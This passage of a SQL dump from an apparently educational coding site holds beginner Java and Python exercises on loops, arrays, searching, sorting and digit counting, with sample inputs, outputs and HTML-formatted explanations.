&nbsp;{</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int ans=0,i,num,numberoftimes;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; System.out.println(\"Enter The Number Of Times And Table value\");</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Scanner sc=new Scanner(System.in);</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; num=sc.nextInt();</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; numberoftimes=sc.nextInt();</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; for(i=1;i&lt;=numberoftimes;i++)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {</p><p><span style=\"white-space:pre\">			</span>ans+=num;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</p><p><span style=\"white-space:pre\">		</span>System.out.println(ans);</p><p>&nbsp; &nbsp; &nbsp; }</p><p>}</p>',NULL,'<p style=\"line-height: 1;\">1. Get num and numberoftimes</p><p style=\"line-height: 1;\">2. <span style=\"color: rgb(41, 82, 24);\">Here the logic is add num to ans for numberoftimes</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">&nbsp; &nbsp; Example</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">&nbsp; &nbsp; 3 * 4 =12</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(41, 82, 24);\">&nbsp; &nbsp; 3 + 3 + 3 + 3 =12 (adding 3 for 4 times)</span></p><p style=\"text-align: start; line-height: 1;\"><span style=\"text-align: justify;\">&nbsp; &nbsp;&nbsp;</span><span style=\"color: rgb(51, 51, 51); font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace; font-size: 13px; text-align: justify; font-style: italic;\">for(i=1;i&lt;=numberoftimes;i++)</span></p><p style=\"text-align: start; line-height: 1;\"><span style=\"color: rgb(51, 51, 51); font-family: Helvetica; font-size: 14px; text-align: justify;\">3. </span><span style=\"font-family: Helvetica; font-size: 14px; text-align: justify; color: rgb(255, 0, 255);\">i is initialized to 1</span><span style=\"color: rgb(51, 51, 51); font-family: Helvetica; font-size: 14px; text-align: justify;\"> and </span><span style=\"font-family: Helvetica; font-size: 14px; text-align: justify; color: rgb(255, 0, 255);\">incremented by 1</span><span style=\"color: rgb(51, 51, 51); font-family: Helvetica; font-size: 14px; text-align: justify;\">. iteration </span><span style=\"font-family: Helvetica; font-size: 14px; text-align: justify; color: rgb(255, 0, 255);\">stops when i is greater than&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;numberoftimes.</span></p><p style=\"text-align: start; line-height: 1;\"><span style=\"color: rgb(51, 51, 51); font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace; font-size: 13px; text-align: justify;\"><br></span></p><p style=\"text-align: start; line-height: 1;\"><span style=\"text-align: justify;\"><span style=\"color: rgb(51, 51, 51); font-family: Helvetica; font-size: 14px;\">4. in each iteration num is added to the ans. ans is initially&nbsp;0.</span></span></p><p style=\"text-align: start; line-height: 1;\"><span style=\"text-align: justify;\"><span style=\"color: rgb(51, 51, 51); font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace; font-size: 13px;\"><br></span></span></p><p style=\"text-align: start; line-height: 1;\"><span style=\"text-align: justify;\"><span style=\"color: rgb(51, 51, 51); font-family: Helvetica; font-size: 14px;\">5. finally print ans.</span></span></p>',24,'','',''),(1044,'Java Program to print Multiplication table of N','Java-Program-to-print-Multiplication-table-of-N','<p style=\"line-height: 1;\">Get input n and print the multiplication table of n\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n4</p><p style=\"line-height: 1;\">Sample output 1:</p><p style=\"line-height: 1;\">\r\n1X4=4</p><p style=\"line-height: 1;\">\r\n2X4=8</p><p style=\"line-height: 1;\">\r\n3X4=12</p><p style=\"line-height: 1;\">\r\n4X4=16</p><p style=\"line-height: 1;\">\r\n5X4=20</p><p style=\"line-height: 1;\">\r\n6X4=24</p><p style=\"line-height: 1;\">\r\n7X4=28\r\n</p><p style=\"line-height: 1;\">8X4=32\r\n</p><p style=\"line-height: 1;\">9X4=36</p><p style=\"line-height: 1;\">\r\n10X4=40</p>','B','','prog/java/MulTable.java','<p><span style=\"font-family: Helvetica; font-size: 14px;\">1. Get table (For which number multiplication table should be printed)</span></p><p><span style=\"font-family: Helvetica; font-size: 14px;\">&nbsp; &nbsp;&nbsp;</span><span style=\"font-family: Helvetica; font-size: 14px; text-align: justify;\"><i>for(i=1;i&lt;=10;i++)</i></span></p><p><span style=\"text-align: justify;\"><font face=\"Menlo, Monaco, Consolas, Courier New, monospace\"><span style=\"font-size: 14px; font-family: Helvetica;\">2. Here i is initialized&nbsp;to 1 and incremented by 1 at every iteration, iteration stops when i is greater than 10.</span></font></span></p><p style=\"line-height: 1.42857; background-color: rgb(255, 255, 255); text-align: justify;\"><i><span style=\"font-family: Helvetica; font-size: 14px;\">System.out.println(i+\"x\"+table+\"=\"+i*table);</span></i></p><p><span style=\"text-align: justify;\"><font face=\"Menlo, Monaco, Consolas, Courier New, monospace\"><span style=\"font-size: 14px; font-family: Helvetica;\">3. prints the multiplication table of the table(number) from 1 to 10.</span></font></span></p><p><br></p>',24,'','',''),(1045,'Java Program to print English Alphabets between two Alphabets','Java-Program-to-print-English-Alphabets-between-two-Alphabets','<p style=\"line-height: 1;\">Get two alphabets and print the alphabets lies between them.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\nD H</p><p style=\"line-height: 1;\">Sample Ouput 1:</p><p style=\"line-height: 1;\">\r\nD E F G H</p>','B','','prog/java/Alies.java','<p style=\"line-height: 1.42857; background-color: rgb(255, 255, 255); text-align: justify;\"><i>for(i=start;i&lt;=stop;i++)</i></p><p style=\"line-height: 1.42857; background-color: rgb(255, 255, 255); text-align: justify;\">i initialized with starting character and incremented by 1 at each iteration. iteration stops when i is greater than stop character.</p><p style=\"line-height: 1.42857; background-color: rgb(255, 255, 255); text-align: justify;\">printing i prints the character from start to stop.</p>',24,'','',''),(1046,'Java Program to get and print the array elements','Java-Program-to-get-and-print-the-array-elements','<p style=\"line-height: 1;\">Get array size n and n elements of array, then print the elements.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5\r\n5 7 9 3 1</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n5 7 9 3 1</p>','B','','prog/java/Array.java','<p style=\"line-height: 1;\">Array is a Collection of data with same type.</p><p style=\"line-height: 1;\">1. Get the size of the Array</p><p style=\"line-height: 1;\">2. Create a array with the given size (Array has 0 to size-1 index to access every location)</p><p style=\"line-height: 1;\"><br></p><table class=\"table table-bordered\"><tbody><tr><td><br></td><td><br></td><td><br></td><td><br></td><td><br></td><td><br></td><td><br></td></tr></tbody></table><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp; 0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 2&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;3&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .................&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;size-2&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; size-1</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\"><span style=\"text-align: justify;\"><i>for(i=0;i&lt;size;i++)</i></span></p><p style=\"line-height: 1;\"><span style=\"text-align: justify;\"><i><br></i></span></p><p style=\"line-height: 1;\"><span style=\"text-align: justify;\">Here i starts at 0, incremented by 1 at every iteration and finally iteration stops when i is equal to size.</span></p><p style=\"line-height: 1;\">Therefore,</p><p style=\"line-height: 1;\">In First iteration i is 0, so a[i] is a[0]</p><p style=\"line-height: 1;\">In second iteration i is 1, so a[i] is a[1]</p><p style=\"line-height: 1;\">....</p><p style=\"line-height: 1;\">In last iteration i is size-1, so a[i] is a[size-1]</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\">the input statement nextInt() reads input and stores in array location consecutively. like a[0], a[1], a[2].....</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\">The second For Loop</p><p style=\"line-height: 1;\">Writes the values of array consecutively to&nbsp; the console using println().</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\"><br></p>',25,'','',''),(1047,'Java Program to find the sum of array elements.','Java-Program-to-find-the-sum-of-array-elements','<p style=\"line-height: 1;\">Get array size n and n elements of array, then compute sum of the elements.</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5\r\n5 7 9 3 1</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n25</p>','B','','prog/java/SArray.java','<p style=\"line-height: 1;\">Array is a Collection of data with same type.</p><p style=\"line-height: 1;\">1. Get the size of the Array</p><p style=\"line-height: 1;\">2. Create a array with the given size (Array has 0 to size-1 index to access every location)</p><p style=\"line-height: 1;\"><br></p><table class=\"table table-bordered\" style=\"width: 681px;\"><tbody><tr><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td></tr></tbody></table><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp; 0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 2&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;3&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ......&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; size-2&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; size-1</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\"><span style=\"text-align: justify;\"><i>for(i=0;i&lt;size;i++)</i></span></p><p style=\"line-height: 1;\"><span style=\"text-align: justify;\"><i><br></i></span></p><p style=\"line-height: 1;\"><span style=\"text-align: justify;\">Here i starts at 0, incremented by 1 at every iteration and finally iteration stops when i is equal to size.</span></p><p style=\"line-height: 1;\">Therefore,</p><p style=\"line-height: 1;\">In First iteration i is 0, so a[i] is a[0]</p><p style=\"line-height: 1;\">In second iteration i is 1, so a[i] is a[1]</p><p style=\"line-height: 1;\">....</p><p style=\"line-height: 1;\">In last iteration i is size-1, so a[i] is a[size-1]</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\">the input statement nextInt() reads input and stores in array location consecutively. like a[0], a[1], a[2].....</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\">The second For Loop</p><p style=\"line-height: 1;\">sums the values of array consecutively like&nbsp;</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\">sum = sum + a[i]</p><p style=\"line-height: 1;\">sum = sum + a[0] in first iteration</p><p style=\"line-height: 1;\">sum = sum + a[1] in second iteration</p><p style=\"line-height: 1;\">......</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\">sum = sum + a[size-1] in last iteration</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\">Finally prints the value of sum.</p><p style=\"line-height: 1;\"><br></p>',25,'','',''),(1048,'Java Program to find the average of array Elements','Java-Program-to-find-the-sum-and-average-of-array-Elements','<p style=\"line-height: 1;\">Get array size n and n elements of array, then compute average of the elements.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5\r\n5 7 9 3 1</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n25\r\n5.0</p>','B','','prog/java/SAvArray.java','<p style=\"line-height: 1;\">Array is a Collection of data with same type.</p><p style=\"line-height: 1;\">1. Get the size of the Array</p><p style=\"line-height: 1;\">2. Create a array with the given size (Array has 0 to size-1 index to access every location)</p><p style=\"line-height: 1;\"><br></p><table class=\"table table-bordered\" style=\"width: 681px;\"><tbody><tr><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td></tr></tbody></table><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp; 0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 2&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;3&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ...........&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;size-2&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; size-1</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\"><span style=\"text-align: justify;\"><i>for(i=0;i&lt;size;i++)</i></span></p><p style=\"line-height: 1;\"><span style=\"text-align: justify;\"><i><br></i></span></p><p style=\"line-height: 1;\"><span style=\"text-align: justify;\">Here i starts at 0, incremented by 1 at every iteration and finally iteration stops when i is equal to size.</span></p><p style=\"line-height: 1;\">Therefore,</p><p style=\"line-height: 1;\">In First iteration i is 0, so a[i] is a[0]</p><p style=\"line-height: 1;\">In second iteration i is 1, so a[i] is a[1]</p><p style=\"line-height: 1;\">....</p><p style=\"line-height: 1;\">In last iteration i is size-1, so a[i] is a[size-1]</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\">the input statement nextInt() reads input and stores in array location consecutively. like a[0], a[1], a[2].....</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\">The second For Loop</p><p style=\"line-height: 1;\">sums the values of array consecutively like&nbsp;</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\">sum = sum + a[i]</p><p style=\"line-height: 1;\">sum = sum + a[0] in first iteration</p><p style=\"line-height: 1;\">sum = sum + a[1] in second iteration</p><p style=\"line-height: 1;\">......</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\">sum = sum + a[size-1] in last iteration</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\">Finally divide sum by size to find the average.</p><p style=\"line-height: 1;\">print average.</p><p style=\"line-height: 1;\"><br></p>',25,'','raptor/average_of_list.png',''),(1049,'Java Program to Search an Element in an array','Java-Program-to-Search-an-Element-in-an-array','<p style=\"line-height: 1;\">Get an element and find the location of element in array, print -1 if element is not found.</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5\r\n5 7 9 3 1\r\n9</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n2</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\n5\r\n5 7 9 3 1\r\n4\r\n</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\n-1</p>','B','','prog/java/SearchArr.java','<p style=\"line-height: 1;\">Array is a Collection of data with same type.</p><p style=\"line-height: 1;\">1. Get the size of the Array</p><p style=\"line-height: 1;\">2. Create a array with the given size (Array has 0 to size-1 index to access every location)</p><p style=\"line-height: 1;\"><br></p><table class=\"table table-bordered\" style=\"width: 681px;\"><tbody><tr><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td></tr></tbody></table><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp; 0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 2&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;3&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .......&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;size-2&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; size-1</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\">3. Get Inputs for Array (See Previous Problems for detail)</p><p style=\"line-height: 1;\">4. Get number to find</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\">In the second For Loop,</p><p style=\"line-height: 1;\">i starts at 0, and incremented by 1 after every iteration. iteration stops when i is equal to size.</p><p style=\"line-height: 1;\">instruction <span style=\"text-align: justify;\">if(num==a[i])</span>&nbsp;inside the for loop checks every location whether it has searching number, if found print the index location.</p><p style=\"line-height: 1;\">In first iteration it checks a[0]</p><p style=\"line-height: 1;\">In second iteration it checks a[1]</p><p style=\"line-height: 1;\">In Third iteration it checks a[2]</p><p style=\"line-height: 1;\">............</p><p style=\"line-height: 1;\">............</p><p style=\"line-height: 1;\">In last iteration it checks a[size-1]</p><p style=\"line-height: 1;\">if number found in any location, further iterations will be terminated using break statement.</p><p style=\"line-height: 1;\">If number not found in any of the location, print \"not found\".</p>',25,'','',''),(1050,'Java Program to find Largest element in the array','Java-Program-to-find-Largest-element-in-the-array','<p style=\"line-height: 1;\">Get array size n and n elements of array, then find the largest element among those elements.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n9</p>','B','','prog/java/LarArr.java','<p style=\"line-height: 1;\">Array is a Collection of data with same type.</p><p style=\"line-height: 1;\">1. Get the size of the Array</p><p style=\"line-height: 1;\">2. Create a array with the given size (Array has 0 to size-1 index to access every location)</p><p style=\"line-height: 1;\"><br></p><table class=\"table table-bordered\" style=\"width: 681px;\"><tbody><tr><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td></tr></tbody></table><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp; 0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 2&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;3&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ......&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;size-2&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; size-1</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\">3. Get Inputs for Array (See Previous Problems for detail)</p><p style=\"line-height: 1;\">4. Initially assume a[0] is the largest number</p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp;max = a[0]</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\">In the second For Loop,<br></p><p style=\"line-height: 1;\">i starts at 0, and incremented by 1 after every iteration. iteration stops when i is equal to size.</p><p style=\"line-height: 1;\"><span style=\"font-family: Helvetica;\">in every iteration the&nbsp;</span><span style=\"color: rgb(51, 51, 51); font-family: Helvetica; font-size: 13px; text-align: justify;\"> if(a[i]&gt;max) <span style=\"font-family: Helvetica; font-size: 14px;\">checks the located element in current index is greater than max</span></span></p><p style=\"line-height: 1;\">if the element located in any position is greater than max,  then assign the element as max by using max = a[i] </p><p style=\"line-height: 1;\">\r\n\r\nfinally max holds the maximum value in the array after all the iterations.<br></p>',25,'','',''),(1051,'Java Program to find Smallest element in the array','Java-Program-to-find-Smallest-element-in-the-array','<p style=\"line-height: 1;\">Get array size n and n elements of array, then find the smallest element among those elements.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5\r\n5 7 9 3 1</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n1</p>','B','','prog/java/SmaArr.java','<p style=\"line-height: 1;\">Array is a Collection of data with same type.</p><p style=\"line-height: 1;\">1. Get the size of the Array</p><p style=\"line-height: 1;\">2. Create a array with the given size (Array has 0 to size-1 index to access every location)</p><p style=\"line-height: 1;\"><br></p><table class=\"table table-bordered\" style=\"width: 681px;\"><tbody><tr><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td></tr></tbody></table><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp; 0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 2&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;3&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ......&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;size-2&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; size-1</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\">3. Get Inputs for Array (See Previous Problems for detail)</p><p style=\"line-height: 1;\">4. Initially assume a[0] is the largest number</p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp;max = a[0]</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\">In the second For Loop,<br></p><p style=\"line-height: 1;\">i starts at 0, and incremented by 1 after every iteration. iteration stops when i is equal to size.</p><p style=\"line-height: 1;\"><span style=\"font-family: Helvetica;\">in every iteration the&nbsp;</span><span style=\"color: rgb(51, 51, 51); font-family: Helvetica; font-size: 13px; text-align: justify;\">&nbsp;</span><span style=\"color: rgb(51, 51, 51); font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace; font-size: 13px; text-align: justify;\">if(a[i]&lt;min)&nbsp;</span><span style=\"color: rgb(51, 51, 51); font-family: Helvetica; text-align: justify;\">checks the located element in current index is less than min</span></p><p style=\"line-height: 1;\">if the element located in any position is less than min, then assign the element as min by using min= a[i]</p><p style=\"line-height: 1;\">finally min holds the minimum value in the array after all the iterations.</p>',25,'','',''),(1052,'Java Program to print all the numbers which are less than given key element from a given array.','Java-Program-to-print-all-the-numbers-which-are-less-than-given-key-element-from-a-given-array','<p style=\"line-height: 1;\">Get an element and print the elements of array which is less than the element.</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5\r\n5 7 9 3 1\r\n4</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n3 1</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\n5\r\n5 7 9 3 1\r\n8</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\n5 7 3 1</p>','B','','prog/java/LessEle.java','<p style=\"line-height: 1;\">Array is a Collection of data with same type.</p><p style=\"line-height: 1;\">1. Get the size of the Array</p><p style=\"line-height: 1;\">2. Create a array with the given size (Array has 0 to size-1 index to access every location)</p><p style=\"line-height: 1;\"><br></p><table class=\"table table-bordered\" style=\"width: 681px;\"><tbody><tr><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td><td style=\"line-height: 1.42857;\"><br></td></tr></tbody></table><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp; 0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 2&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;3&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ......&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;size-2&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; size-1</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\">3. Get Inputs for Array (See Previous Problems for detail)</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\">In the second for loop&nbsp;</p><p style=\"line-height: 1.42857; background-color: rgb(255, 255, 255); text-align: justify;\"> if(a[i]&lt;num) checks whether element in the location less than num</p><p style=\"line-height: 1;\"> if the value located in a postion is lesser than the element given by user, then print the value using system.out.println statement.</p>',25,'','',''),(1053,'Java Program to Sort the Elements in ascending order.','Java-Program-to-Sort-the-Elements-in-ascending-order','<p style=\"line-height: 1;\">Get array size n and n elements of array, then sort the elements of array in ascending order.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5\r\n5 7 9 3 1</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">1 3 5 7 9</p>','B','','prog/java/Ascen.java','',25,'','',''),(1054,'Java Program to Sort the Elements in descending order.','Java-Program-to-Sort-the-Elements-in-descending-order','<p style=\"line-height: 1;\">Get array size n and n elements of array, then sort the elements of array in descending order.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">9 7 5 3 1\r\n</p>','B','','prog/java/Descen.java','',25,'','',''),(1074,'Java Program to Print the English Alphabets In Lower Case','java-program-to-print-the-english-alphabets-in-lower-case','<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"413\" style=\"width: 310pt;\"><tbody><tr height=\"80\" style=\"height:60.0pt\">\r\n  <td height=\"80\" class=\"xl63\" width=\"413\" style=\"height:60.0pt;width:310pt\">Write a\r\n  java Program to print the following output:<br>\r\n    Output:<br>\r\n    <br>\r\n    a b c d e f g h I j k l m n o p q r s t u v w x y z</td></tr></tbody></table>','B','','prog/java/All.java','',29,'','',''),(1055,'Count the number of digits in a Number in Python','count-the-number-of-digits-in-a-number-in-python','<p>Write a program to count the number of digits of a given number.</p><p>Sample Input 1:</p><p>345</p><p>Sample Output 1:</p><p>3</p><p>Sample Input 2:</p><p>56</p><p>Sample Output 2:</p><p>2</p><p><br></p>','B','<div>n = int(input())</div><div>count&nbsp; = 0</div><div>while&nbsp; n &gt; 0:</div><div>&nbsp; &nbsp; n = n // 10</div><div>&nbsp; &nbsp; count = count + 1</div><div>print(count)</div>',NULL,'<p>if we divide a number by 10, then last digit of the same number will removed and we get remaining digits as output. Do the same till number becomes 0 and count iteration. So the count is number of digits of the given number .</p>',26,NULL,NULL,NULL),(1056,'Find given number is a digit in a number using Python','find-given-number-is-a-digit-in-a-number-using-python','<p>Get a number and a digit and find whether the digit is occurred in the number.</p><p>Sample Input 1:</p><p>Enter the number: 234</p><p>Enter the Digit : 4</p><p>Sample Output 1:</p><p>4 is occurred in 234</p><p>Sample Input 